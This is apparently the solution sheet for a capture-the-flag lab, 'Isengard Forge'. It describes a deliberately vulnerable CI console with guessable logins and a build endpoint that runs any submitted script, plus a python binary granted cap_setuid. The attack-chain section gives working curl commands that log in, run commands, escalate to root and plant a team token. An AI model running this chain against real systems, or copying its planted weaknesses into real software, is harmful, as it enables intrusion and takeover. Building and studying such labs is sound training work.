# Hill 8 - Isengard Forge (weak-cred CI console -> build RCE -> cap_setuid)

*Theme: LOTR / Isengard.* A CI "forge" whose build console runs submitted scripts.
Entry is a set of weak, guessable foreman credentials.

- **Entry:** log in at `POST /forge/login` with weak creds (`saruman:isengard` or
  `builder:builder`), then `POST /forge/run` executes your build script -> shell.
  Foothold: `orc`. Port 80 (8088 locally).
- **Privesc:** `/usr/local/bin/forgepy` (a python copy) carries `cap_setuid+ep`
  (**Linux capability** misconfig): `forgepy -c 'import os;os.setuid(0);
  os.system("cat /root/root.txt")'`. Re-applied on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. log in with weak creds (grab the session cookie)
    C=$(curl -s -i -X POST -d 'user=saruman&password=isengard' http://127.0.0.1:8088/forge/login \
        | grep -i set-cookie | sed 's/.*forge=//; s/;.*//' | tr -d '\r')
    # 2. build RCE -> user flag
    curl -s -X POST -b "forge=$C" -d 'script=cat /home/orc/user.txt' http://127.0.0.1:8088/forge/run
    # 3. privesc via cap_setuid -> root flag
    curl -s -X POST -b "forge=$C" --data-urlencode \
      'script=forgepy -c "import os;os.setuid(0);os.system(\"cat /root/root.txt\")"' \
      http://127.0.0.1:8088/forge/run
    # 4. take the hill: write your token to /root/king.txt as root
    curl -s -X POST -b "forge=$C" --data-urlencode \
      'script=forgepy -c "import os;os.setuid(0);os.system(\"echo TOK-YOUR-TEAM > /root/king.txt\")"' \
      http://127.0.0.1:8088/forge/run

> Note: file capabilities need the container to keep `cap_setuid` in its bounding set
> (the docker default). On a locked-down runtime, swap this privesc for a SUID copy.

## Run locally

    docker compose up -d --build   # app: http://localhost:8088/
